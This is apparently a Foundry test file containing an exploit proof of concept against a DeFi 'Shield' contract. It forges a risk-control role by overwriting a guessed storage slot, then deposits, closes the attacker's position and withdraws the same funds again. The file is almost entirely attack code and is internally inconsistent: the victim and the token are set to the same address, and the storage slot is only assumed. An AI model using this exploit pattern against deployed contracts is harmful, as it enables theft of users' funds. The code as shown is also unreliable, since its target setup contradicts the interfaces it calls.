// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IShield {
    function owner() external view returns (address);
    function setRiskControl(address _riskControl) external;
    function deposit(uint256 amount) external;
    function closePosition(address user) external;
    function withdraw(uint256 amount) external;
}

interface WBTC {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    IShield private victim;
    WBTC private token;
    address private riskControl = address(0x1337c0de);
    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        uint8 decimals = 8;
        uint256 depositAmount = 100 * (10**decimals);

        token = WBTC(TARGET);
        victim = IShield(TARGET);

        // Fund attacker to make the initial deposit.
        deal(address(token), attacker, depositAmount);

        // Fund the victim contract so it has liquidity for all withdrawals.
        deal(address(token), address(victim), depositAmount);

        // Forcefully grant the riskControl role by overwriting the storage slot.
        // Assuming owner is in slot 0, riskControl is likely in slot 1.
        vm.store(address(victim), bytes32(uint256(1)), bytes32(uint256(uint160(riskControl))));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint8 decimals = 8;
        uint256 depositAmount = 100 * (10**decimals);

        // Step 1: Attacker deposits funds to open a position.
        token.approve(address(victim), depositAmount);
        victim.deposit(depositAmount);

        // Step 2: The riskControl account (which we now control) closes the position.
        vm.startPrank(riskControl);
        victim.closePosition(attacker);
        vm.stopPrank();

        // Step 3: Attacker withdraws the funds again due to the state update flaw.
        victim.withdraw(depositAmount);
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

